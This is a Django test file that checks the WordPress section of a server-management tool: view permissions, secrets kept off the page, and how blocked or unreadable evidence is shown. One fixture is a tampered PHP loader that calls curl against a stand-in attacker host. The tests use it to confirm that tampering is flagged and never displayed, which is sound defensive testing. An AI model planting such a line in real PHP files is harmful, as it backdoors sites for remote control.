"""The site's WordPress section through the worker and the page, behind its own permission.

docs/wordpress.md#passive-application-discovery
"""

from operations.models import RemoteOperation
from servers.models import Server
from wordpress.convention import CORE_VERSION
from wordpress.fakes import SALT_VALUES, ApplicationServer

from .fakes import DiscoveryTestCase, add_site, mariadb_rows
from .models import SiteApplicationObservation

BASE = ("view_server", "add_server", "add_discoveryattempt", "view_siteobservation")
APPLICATION = "view_siteapplicationobservation"
SECTIONS = ("overview", "database", "https", "activity", "advanced")
EDITED = "<?php\nsystem('curl evil.example');\n"


class ApplicationPageTests(DiscoveryTestCase):
    def discover_as(self, *codenames: str, root: bool = True, **install: object) -> Server:
        add_site(self.remote, "alpha", ("alpha.test",))
        self.remote.catalogs.mariadb["salpha"] = mariadb_rows("salpha")
        apps = ApplicationServer(self.remote)
        if root:
            apps.as_root()
        apps.install("alpha", ("alpha.test",), **install)  # type: ignore[arg-type]
        self.grant(*codenames)
        server = self.register()
        self.run_worker()
        return server

    def section(self, server: Server, name: str = "wordpress") -> str:
        return self.client.get(f"/servers/{server.pk}/sites/alpha/{name}/").content.decode()

    def test_a_fresh_controller_shows_the_reconstructed_application_with_its_time(self) -> None:
        server = self.discover_as(*BASE, APPLICATION)
        response = self.client.get(f"/servers/{server.pk}/sites/alpha/wordpress/")
        self.assertContains(response, "<strong>Installed.</strong>")
        self.assertContains(response, 'aria-current="page">WordPress</a>')
        self.assertContains(response, f"{CORE_VERSION}. The qualified release.")
        self.assertContains(response, "All 12 core tables with their required columns")
        self.assertContains(response, "https://alpha.test")
        self.assertContains(response, "Collected <time")
        self.assertContains(response, "This is a snapshot, not live status.")
        self.assertContains(response, "Barectl did not run WordPress, WP-CLI or any plugin")
        self.assertContains(response, "explicit WordPress inspection")
        content = response.content.decode()
        for salt in SALT_VALUES:
            self.assertNotIn(salt, content)
        self.assertNotIn("DB_PASSWORD", content)
        self.assertEqual(SiteApplicationObservation.objects.get().state, "installed")

    def test_blocked_and_unread_evidence_is_explained_not_hidden(self) -> None:
        server = self.discover_as(*BASE, APPLICATION, loader=EDITED)
        page = self.section(server)
        self.assertIn("<strong>Blocked.</strong>", page)
        self.assertIn("The public wp-config.php is not the fixed loader.", page)
        self.assertNotIn("curl evil.example", page)
        self.assertIn("Not the fixed loader", page)

    def test_a_lesser_identity_sees_unread_evidence_never_absence_or_installation(self) -> None:
        server = self.discover_as(*BASE, APPLICATION, root=False)
        page = self.section(server)
        self.assertIn("<strong>Unreadable.</strong>", page)
        self.assertIn("never escalates", page)
        self.assertIn("neither absence nor proof", page)
        self.assertNotIn("Installed.", page)

    def test_the_section_needs_its_own_view_permission(self) -> None:
        server = self.discover_as(*BASE)
        self.assertEqual(
            self.client.get(f"/servers/{server.pk}/sites/alpha/wordpress/").status_code, 403
        )
        self.assertEqual(
            self.client.get(
                f"/servers/{server.pk}/sites/alpha/wordpress/",
                headers={"HX-Request": "true"},
            ).status_code,
            403,
        )
        for section in SECTIONS:
            with self.subTest(section=section):
                page = self.section(server, section)
                self.assertNotIn("/wordpress/", page)
                self.assertNotIn("WordPress application", page)
        self.grant(APPLICATION)
        self.assertEqual(
            self.client.get(f"/servers/{server.pk}/sites/alpha/wordpress/").status_code, 200
        )

    def test_the_application_view_does_not_grant_the_site_view(self) -> None:
        server = self.discover_as("view_server", "add_server", "add_discoveryattempt", APPLICATION)
        self.assertEqual(
            self.client.get(f"/servers/{server.pk}/sites/alpha/wordpress/").status_code, 403
        )

    def test_server_activity_and_history_pages_carry_no_application_information(self) -> None:
        server = self.discover_as(*BASE, loader=EDITED, configuration=EDITED)
        pages = [
            self.client.get(f"/servers/{server.pk}/").content.decode(),
            self.client.get(f"/servers/{server.pk}/sites/").content.decode(),
            self.client.get(f"/servers/{server.pk}/advanced/").content.decode(),
            self.client.get(f"/servers/{server.pk}/activity/").content.decode(),
            self.client.get("/activity/").content.decode(),
            self.client.get(f"/servers/{server.pk}/sites/alpha/overview/").content.decode(),
            self.client.get(f"/servers/{server.pk}/sites/alpha/activity/").content.decode(),
        ]
        for page in pages:
            for private in ("supported grammar", "fixed loader", "siteurl", "Blocked resources"):
                self.assertNotIn(private, page)

    def test_viewing_the_section_neither_connects_nor_queues_work(self) -> None:
        server = self.discover_as(*BASE, APPLICATION)
        connections = len(self.remote.targets)
        operations = RemoteOperation.objects.count()
        self.section(server)
        self.assertEqual(len(self.remote.targets), connections)
        self.assertEqual(RemoteOperation.objects.count(), operations)

    def test_a_failed_later_check_marks_the_evidence_possibly_out_of_date(self) -> None:
        server = self.discover_as(*BASE, APPLICATION)
        self.remote.failure = "Connection refused"
        self.client.post(f"/servers/{server.pk}/verify/")
        self.run_worker()
        page = self.section(server)
        self.assertIn("may be out of date", page)
        self.assertIn("Installed.", page)

    def test_an_unknown_site_has_no_application_section(self) -> None:
        server = self.discover_as(*BASE, APPLICATION)
        response = self.client.get(f"/servers/{server.pk}/sites/nobody/wordpress/")
        self.assertContains(response, "Site not found in the latest observation")
        self.assertNotContains(response, "WordPress application")
